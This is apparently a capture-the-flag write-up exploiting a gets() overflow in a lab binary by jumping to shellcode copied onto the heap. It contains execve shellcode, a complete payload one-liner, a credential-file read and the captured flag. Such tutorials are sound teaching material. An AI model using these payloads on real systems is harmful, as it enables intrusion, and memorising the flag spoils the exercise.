# 💥 Level2 - Return-to-Heap Exploit

![Helldivers Battle](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExaHB4ZjJrYjBpYnZ0cGt5YmJkdHNmOXN4Nnh1eHBxZGE3YmVyNmRnZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l3q2K5jinAlChoCLS/giphy.gif)

Advanced buffer overflow with heap exploitation! 🔥

## 📋 Binary Analysis

### 🔍 Main Function (Ghidra)
```c
void main(void)
{
    p();
    return;
}
```

### 🎯 P Function (Decompiled)
```c
void p(void)
{
    unsigned int ret_addr;
    char buffer[76];
    
    fflush(stdout);
    gets(buffer);
    
    ret_addr = __builtin_return_address(0);
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret_addr);
        _exit(1);
    }
    
    puts(buffer);
    strdup(buffer);
    return;
}
```

## 🚨 Vulnerability

### The Problem
- `gets()` is **unsafe** - no boundary checking! ⚠️
- Buffer is **76 bytes** (0x4c)
- EIP offset at **80 bytes**
- **NEW**: Return address protection checks for stack addresses (0xb...)

### The Stack Protection
```asm
0x080484f2 <+30>:    mov    0x4(%ebp),%eax     # Get return address
0x080484fb <+39>:    and    $0xb0000000,%eax   # Mask high bits
0x08048500 <+44>:    cmp    $0xb0000000,%eax   # Check if 0xb...
0x08048505 <+49>:    jne    0x8048527 <p+83>   # If NOT stack, continue
```

This prevents classic stack-based exploits! Stack addresses start with `0xbffff...`

### The Bypass: Heap Exploitation 🎯
- `strdup()` allocates memory on the **heap**
- Heap addresses start with `0x0804...` (not `0xb...`)
- No ASLR - heap address is **predictable**: `0x0804a008`
- We can place shellcode in input → strdup copies to heap → jump to heap!

## 💣 Exploit Strategy

### Step 1: Find Heap Address
```bash
ltrace ./level2
# Input: AAAA
# Output: strdup("AAAA") = 0x0804a008
```

Or with GDB:
```bash
gdb level2
(gdb) break *0x0804853d    # After strdup
(gdb) run
# Input: AAAA
(gdb) info registers eax   # 0x804a008
```

### Step 2: Find EIP Offset
```bash
gdb level2
(gdb) run
# Input: Aa0Aa1Aa2Aa3...Ad2A (pattern)
# Crash: 0x37634136
# Offset: 80 bytes
```

### Step 3: Use Shellcode from Exploit-DB (24 bytes)

**Source**: [Exploit-DB Shellcode #42428](https://www.exploit-db.com/shellcodes/42428)  
**Author**: Touhid M.Shaikh  
**Platform**: Linux/x86  
**Description**: Stack-based execve("/bin/sh") shellcode

```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

**Assembly Breakdown**:
```asm
xor    eax, eax              # Clear eax (NULL)
cdq                          # Sign extend eax to edx (edx = 0)
push   eax                   # Push NULL terminator
push   0x68732f2f            # Push "//sh"
push   0x6e69622f            # Push "/bin"
mov    ebx, esp              # ebx = pointer to "/bin//sh"
push   eax                   # Push NULL (argv[1])
push   ebx                   # Push address of "/bin//sh" (argv[0])
mov    ecx, esp              # ecx = pointer to argv array
mov    al, 0x0b              # syscall 11 = execve
int    0x80                  # Make syscall
```

### Step 4: Calculate Payload
```
[Shellcode: 24 bytes] + [Padding: 56 bytes] + [Heap Address: 4 bytes]
                                                    ↓
                                               0x0804a008
```

### Step 5: Execute Exploit
```bash
(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

### Step 6: Get the Flag
```bash
whoami    # level3
cat /home/user/level3/.pass
```

## 🔑 Key Concepts

| Concept | Description |
|---------|-------------|
| **Return-to-Heap** | Bypass stack protection by executing code from heap |
| **strdup()** | Copies string to heap using malloc |
| **No ASLR** | Address Space Layout Randomization disabled - predictable addresses |
| **Address Filtering** | Protection checks return address to prevent stack-based exploits |
| **NX Disabled** | Can execute code from heap (no DEP protection) |
| **Little-endian** | Addresses stored LSB first: 0x0804a008 → \x08\xa0\x04\x08 |

## 🎓 Learning Points

### Why This Works
1. ✅ **gets()** allows buffer overflow
2. ✅ **strdup()** copies our shellcode to **predictable heap address**
3. ✅ Heap address `0x0804a008` bypasses the `0xb...` stack check
4. ✅ **No ASLR** - heap address is always the same
5. ✅ **No NX** - we can execute code from heap

### Security Mitigations Bypassed
- ❌ Stack canaries: None present
- ❌ ASLR: Disabled
- ❌ DEP/NX: Not enforced on heap
- ✅ Stack address filtering: **Bypassed by using heap!**

### Modern Protections That Would Stop This
- 🛡️ **ASLR**: Randomizes heap addresses
- 🛡️ **DEP/NX**: Marks heap as non-executable
- 🛡️ **Full RELRO**: Makes GOT read-only
- 🛡️ **Stack canaries**: Detect buffer overflows

## 📊 Memory Layout

```
Stack (0xbffff...)  ← Blocked by protection check
    ↓
[Buffer: 76 bytes]
[Saved EBP: 4 bytes]
[Return Address: 4 bytes] ← We overwrite with 0x0804a008
    ↓
Heap (0x0804a...)   ← Our shellcode lives here!
    ↓
[Shellcode: 26 bytes] ← Execution jumps here
```

---

> 💡 **Pro Tip**: When stack is protected, look for heap allocations like `malloc()`, `strdup()`, `calloc()`!

> ⚠️ **Security Note**: This demonstrates why multiple security layers (ASLR + DEP + Canaries) are needed!

## 🎉 Victory!

![Helldivers Victory](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExbGJ6eWN6cjZlZXQxOWUwOGVxZnMwYzU3ZmE5ZWI2YjFjNXA5ZDJhZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/26BRuo6sLetdllPAQ/giphy.gif)

**Flag captured!** 🚩

```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

**Difficulty**: ⭐⭐⭐ Intermediate - Return-to-heap technique!
